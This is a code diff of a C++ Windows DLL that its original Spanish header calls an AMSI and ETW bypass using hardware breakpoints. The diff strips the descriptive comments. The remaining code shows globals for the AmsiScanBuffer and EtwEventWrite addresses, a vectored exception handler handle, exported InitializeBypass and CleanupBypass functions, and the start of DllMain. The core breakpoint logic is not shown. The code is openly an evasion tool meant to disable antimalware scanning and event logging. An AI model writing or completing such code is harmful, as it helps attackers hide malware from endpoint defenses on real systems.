@@ -1,22 +1,13 @@
-// ============================================================
-// amsi_etw_bypass.cpp
-// DLL de bypass de AMSI y ETW mediante hardware breakpoints
-
 
 #include "pch.h"
 #include <amsi.h>
 #include <evntprov.h>
 #include <evntrace.h>
 
-// ============================================================
-// TIPOS DE FUNCIÓN (cargadas dinámicamente)
-// ============================================================
 typedef VOID(NTAPI* pRtlCaptureContext)(PCONTEXT ContextRecord);
 typedef NTSTATUS(NTAPI* pNtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
 
-// ============================================================
-// VARIABLES GLOBALES
-// ============================================================
+
 static PVOID g_vehHandle = nullptr;
 static PVOID g_amsiScanBufferAddr = nullptr;
 static PVOID g_etwEventWriteAddr = nullptr;
@@ -103,9 +94,7 @@ BOOL SetupHardwareBreakpoints()
     return (status == 0);
 }
 
-// ============================================================
-// Exportadas
-// ============================================================
+
 extern "C" __declspec(dllexport) BOOL InitializeBypass()
 {
     OutputDebugStringW(L"[AmsiEtwBypass] Inicializando bypass...\n");
@@ -142,9 +131,7 @@ extern "C" __declspec(dllexport) void CleanupBypass()
     OutputDebugStringW(L"[AmsiEtwBypass] Bypass limpiado\n");
 }
 
-// ============================================================
-// DllMain
-// ============================================================
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
     switch (ul_reason_for_call)
